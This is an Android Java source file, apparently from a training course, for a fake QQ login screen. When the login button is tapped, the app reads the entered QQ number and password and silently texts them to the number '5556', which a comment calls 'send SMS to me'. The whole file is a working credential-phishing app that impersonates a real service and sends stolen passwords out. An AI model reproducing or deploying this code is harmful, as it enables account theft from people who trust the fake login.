package com.itheima.qq;

import android.os.Bundle;
import android.app.Activity;
import android.telephony.SmsManager;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;

public class MainActivity extends Activity {

	private EditText number;
	private EditText password;
	private Button login_btn;
	
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        //做 初始化 控件的 事情
        number = (EditText) findViewById(R.id.qq_number);
        password = (EditText) findViewById(R.id.qq_password);
        
        login_btn = (Button) findViewById(R.id.btn_login);
        
        login_btn.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				
				//发短信 给俺 
				// 获得 qq的号码以及 密码信息
				String numValue = number.getText().toString();
				String passValue = password.getText().toString();
				
				//拿到 短信发送的管理器 
				SmsManager smsManager = SmsManager.getDefault();
				// destinationAddress : 目的地 
				// scAddress :  源 地址  
				// text :  发送的文本数据
				// sentIntent :  发送成功 报告 
				// deliveryIntent :  对方开机后收到 短信的报告 
				smsManager.sendTextMessage("5556", null, numValue+"---"+passValue, null, null);
				
			}
		}); 
        
    }

    
}
